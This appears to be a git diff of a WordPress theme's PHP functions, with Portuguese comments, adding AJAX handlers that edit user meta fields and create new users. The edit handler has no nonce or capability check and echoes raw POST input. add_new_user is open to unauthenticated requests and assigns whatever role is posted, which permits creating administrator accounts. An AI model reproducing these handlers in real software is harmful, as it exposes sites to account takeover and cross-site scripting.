@@ -97,20 +97,93 @@ add_action('wp_ajax_editar_usuario', 'editar_usuario_callback');
 function editar_usuario_callback() {
 	// Verifique o nonce, valide os dados e verifique as permissões se necessário
 
-	parse_str($_POST['formData'], $formData);
+	$formData = $_POST; // Dados do formulário já estão no formato correto
 
-	// Processar os dados do formulário e atualizar as informações do usuário
-	// Substitua esta parte do código com a lógica específica de atualização do usuário
+	// Mostrar os dados recebidos
+	echo "<strong>Dados Recebidos:</strong><br>";
+	foreach ($formData as $key => $value) {
+		echo "$key: $value<br>";
+	}
+	echo "<br>";
+
+	// Lista de campos a serem atualizados
+	$campos = array(
+		'profile_picture',
+		'razao_social',
+		'nome_fantasia',
+		'cnpj',
+		'inscricao_estadual',
+		'endereco',
+		'bairro',
+		'cidade',
+		'uf',
+		'cep',
+		'telefone',
+		'celular',
+		'email',
+		'email_financeiro',
+		'email_danfe_xml'
+	);
+
+	// Verificar se o ID do usuário está presente nos dados do formulário
+	if (!isset($formData['user_id'])) {
+		echo json_encode(array('error' => 'Dados de usuário não encontrados.'));
+		wp_die();
+	}
 
 	$user_id = $formData['user_id'];
-	$razao_social = $formData['razao_social'];
-	$cnpj = $formData['cnpj'];
+	$update_successful = false;
 
-	// Atualizar as metainformações do usuário
-	update_user_meta($user_id, 'razao_social', $razao_social);
-	update_user_meta($user_id, 'cnpj', $cnpj);
+	// Processar os dados do formulário e atualizar as informações do usuário
+	foreach ($campos as $campo) {
+		if (isset($formData[$campo])) {
+			$valor = $formData[$campo];
+			update_user_meta($user_id, $campo, $valor);
+			$update_successful = true; // Atualização bem-sucedida se ao menos um campo for atualizado
+		}
+	}
 
-	// Retornar uma resposta (por exemplo, em formato JSON)
-	echo json_encode(array('success' => true));
+	// Mostrar os dados processados
+	echo "<strong>Dados Processados:</strong><br>";
+	foreach ($campos as $campo) {
+		$valor_atualizado = get_user_meta($user_id, $campo, true);
+		echo "$campo: $valor_atualizado<br>";
+	}
+
+	// Verificar se houve sucesso na atualização
+	if ($update_successful) {
+		echo json_encode(array('success' => 'Dados atualizados com sucesso.'));
+	} else {
+		echo json_encode(array('error' => 'Nenhum dado a ser atualizado.'));
+	}
+
 	wp_die();
 }
+
+function add_user_script() {
+	wp_enqueue_script('add-user-script', get_template_directory_uri() . '/js/add-user-script.js', array('jquery'), '', true);
+	wp_localize_script('add-user-script', 'add_user_ajax', array('ajax_url' => admin_url('admin-ajax.php')));
+}
+add_action('wp_enqueue_scripts', 'add_user_script');
+
+
+function add_new_user() {
+	$username = $_POST['username'];
+	$email = $_POST['email'];
+	$password = $_POST['password'];
+	$role = $_POST['role'];
+
+	$user_id = wp_create_user($username, $password, $email);
+
+	if (!is_wp_error($user_id)) {
+		$user = new WP_User($user_id);
+		$user->set_role($role);
+		echo 'Usuário adicionado com sucesso!';
+	} else {
+		echo 'Erro ao adicionar usuário: ' . $user_id->get_error_message();
+	}
+
+	die();
+}
+add_action('wp_ajax_add_new_user', 'add_new_user');
+add_action('wp_ajax_nopriv_add_new_user', 'add_new_user');
